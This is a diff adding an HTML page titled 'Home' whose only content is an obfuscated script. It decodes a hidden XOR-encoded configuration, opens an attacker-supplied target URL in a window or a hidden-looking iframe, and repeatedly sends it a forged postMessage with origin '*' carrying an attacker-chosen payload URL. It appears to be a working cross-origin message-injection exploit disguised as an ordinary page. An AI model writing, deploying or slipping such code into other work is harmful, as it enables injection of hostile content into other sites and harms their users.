@@ -1,0 +1,48 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Home</title>
+<style>
+html,body{margin:0;height:100%;background:#fff;font:14px/1.5 system-ui,sans-serif}
+button{position:fixed;top:10px;left:10px;font-size:14px;padding:4px 14px}
+</style>
+</head>
+<body>
+<button id="b" hidden>Open</button>
+<script>
+'use strict';
+(function(){
+var K='dK7';
+var D=function(s){try{var b=atob(s),o='',i=0;for(;i<b.length;i++)o+=String.fromCharCode(b.charCodeAt(i)^K.charCodeAt(i%K.length));return decodeURIComponent(escape(o));}catch(e){return '';}};
+var C=JSON.parse(D('H2lTRnEXRi9WECoNEC5PEGRdBT1WFyhFDTtDSCpbATlDTC9YBz5aASVDSi9YCSpeCmIVSGsVEDIVXmsVEDJHAWkbRGlUAmkNRGlUCyVRDSwVSGsVEicVXmsVEipbES4VSGsVFz4VXmsVFyhFDTtDMTlbRmcXRjlRRnEXRjlSFCdWBy5aASVDIiJSCC9ERmcXRjtaRnEXRjtYFz96AThEBSxSRmcXRiRHRnEXRixYRjY='));
+var pk=function(s){var o={};new URLSearchParams(s).forEach(function(v,k){o[k]=v});return o;};
+var S=pk(location.search.substring(1)),H=pk(location.hash.substring(1));
+var g=function(){for(var i=0;i<arguments.length;i++){var v=S[arguments[i]]||H[arguments[i]];if(v)return v;}return '';};
+var t=g('t');
+if(!/^(https?:\/\/)/i.test(t))return;
+var pv=g('p');
+var PL=pv?(/^(data:|https?:)/i.test(pv)?pv:D(pv)):C.d;
+var z={};z[C.su]=PL;z[C.rf]=[];
+var M={};M[C.ty]=C.cf;M[C.vl]=z;
+var fire=function(w){var n=0;var iv=setInterval(function(){try{w[C.pm](M,'*');n++;if(dbg)console.debug(C.op,n);}catch(e){}},150);setTimeout(function(){clearInterval(iv);if(dbg)console.debug(C.op,'end');},15000);};
+var dbg=g('dbg');
+var auto=/^(1|true|yes|on)$/i.test(g('a'));
+var w=null;
+try{w=open(t,'_blank');}catch(e){}
+if(w){fire(w);return;}
+if(auto){
+var f=document.createElement('iframe');
+f.style.cssText='position:fixed;right:8px;bottom:8px;width:360px;height:260px;border:0;opacity:.85';
+f.src=t;document.body.appendChild(f);
+fire(f.contentWindow);
+return;
+}
+var b=document.getElementById('b');
+b.hidden=false;
+b.onclick=function(){var x=null;try{x=open(t,'_blank');}catch(e){}if(x)fire(x);};
+})();
+</script>
+</body>
+</html>
